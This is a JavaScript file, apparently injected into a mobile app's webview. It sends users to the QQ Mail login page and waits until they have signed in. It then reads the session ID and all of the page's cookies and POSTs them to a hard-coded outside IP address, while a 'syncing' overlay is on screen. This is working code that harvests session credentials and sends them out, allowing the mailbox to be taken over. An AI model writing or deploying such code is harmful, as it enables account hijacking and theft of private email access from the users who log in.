console.log("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBB");
console.log(window.location.href);


var SQB_MEMBERID_KEY = 'SQB_MEMBERID_KEY';

function getQueryString(name) {
	var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
	console.log("nihao:" + window.location.href.split("?")[1]);
	var r = window.location.href.split("?")[1].match(reg); //search,查询？后面的参数，并匹配正则
	if (r != null) return unescape(r[2]);
	return null;
}
//http://139.155.8.217/api/Member/GetInviteUserPhone?id=5
//获取用户ID
(function checkId() {
	var href = window.location.href;
	if (href.indexOf("http://139.155.8.217/api/Sync/Notthing") != -1) {
		var memberId = getQueryString("id");
		plus.storage.setItem(SQB_MEMBERID_KEY, memberId);
		//window.location.href = 'https://w.mail.qq.com/cgi-bin/loginpage?f=xhtml';
		window.location.href = 'https://mail.qq.com';
	}
})();

//自动跳转到登录界面
(function checkId() {
	var href = window.location.href;
	if (href.indexOf("https://w.mail.qq.com/cgi-bin/loginpage") != -1) {
		console.log('goto login');
		window.location.href =
			'https://w.mail.qq.com/cgi-bin/loginpage?f=xhtml&amp;kvclick=loginpage|app_push|enter|ios&amp;ad=false&amp;f=xhtml';
	}
})();



// //上传登录信息到服务器
function qqmailIslogin() {
	var href = window.location.href;
	if (href.indexOf("https://w.mail.qq.com/cgi-bin/mobile") != -1) {
		return true;
	}
	if (href.indexOf("https://w.mail.qq.com/cgi-bin/today") != -1) {
		return true;
	}
	return false;
};

function showLoading(){
	//获取浏览器页面可见高度和宽度
	var _PageHeight = document.documentElement.clientHeight,
		_PageWidth = document.documentElement.clientWidth;
	//计算loading框距离顶部和左部的距离（loading框的宽度为215px，高度为61px）
	var _LoadingTop = _PageHeight > 61 ? (_PageHeight - 61) / 2 : 0,
		_LoadingLeft = _PageWidth > 215 ? (_PageWidth - 215) / 2 : 0;
	//在页面未加载完毕之前显示的loading Html自定义内容
	var _LoadingHtml = '<div id="loadingDiv" style="position:absolute;left:0;width:100%;height:' + _PageHeight +
		'px;top:0;background:#f3f8ff;opacity:0.8;filter:alpha(opacity=80);z-index:10000;"><div style="position: absolute; cursor1: wait; left: ' +
		_LoadingLeft + 'px; top:' + _LoadingTop +
		'px; width: auto; height: 57px; line-height: 57px; padding-left: 50px; padding-right: 5px; background: #fff url(http://139.155.8.217/loading.gif) no-repeat scroll 5px 10px; border: 2px solid #95B8E7; color: #696969; font-family:\'Microsoft YaHei\';">后台同步中，请等待...</div></div>';
	//呈现loading效果
	document.write(_LoadingHtml);
}



//加载状态为complete时移除loading效果
function completeLoading() {
	var loadingMask = document.getElementById('loadingDiv');
}

function postServer(memberid, sid, cookie) {
	xhr = new plus.net.XMLHttpRequest();
	xhr.onerror = function(e) {
		var str = "lengthComputable=" + e.lengthComputable + "loaded=" + e.loaded + ";total=" + e.total;
		console.log("onerror: " + str);
	};
	xhr.onreadystatechange = function() {
		switch (xhr.readyState) {
			// case 0:alert("xhr请求已初始化");break;
			// case 1:alert("xhr请求已打开");break;
			case 2:
				//alert("正在准备同步中,请勿离开此页面,约需一分钟左右");
				break;
				// case 3:alert("xhr请求已响应");break; 
			case 4:
				completeLoading();
				if (xhr.status == 200) {
					//alert("请返回首页,点击更新账单");
					var ws = plus.webview.currentWebview();
					plus.webview.close(ws);
				} else {
					alert("请求失败：" + xhr.readyState + "请截图给开发人员");
				}
				break;
			default:
				break;
		}
	};
	xhr.open("POST", "http://139.155.8.217/api/Sync/SyncAsync");
	var data = {
		MemberId: memberid,
		Mail: '',
		Sid: sid,
		Cookie: cookie
	};
	xhr.setRequestHeader('Content-Type', 'application/json');
	xhr.send(JSON.stringify(data));
	showLoading();
}

function plusReady() {
	if (qqmailIslogin()) {
		var memberId = plus.storage.getItem(SQB_MEMBERID_KEY);
		var sid = getQueryString('sid');
		var cookie = document.cookie;
		//console.log(`准备提交服务器:memeberid:${memberId},sid:${sid}, cookie:${cookie}`);
		//console.log(`当前url:${window.location.href}`);
		postServer(memberId, sid, cookie);
	}
}

if (window.plus) {
	plusReady();
} else {
	document.addEventListener('plusready', plusReady, false);
}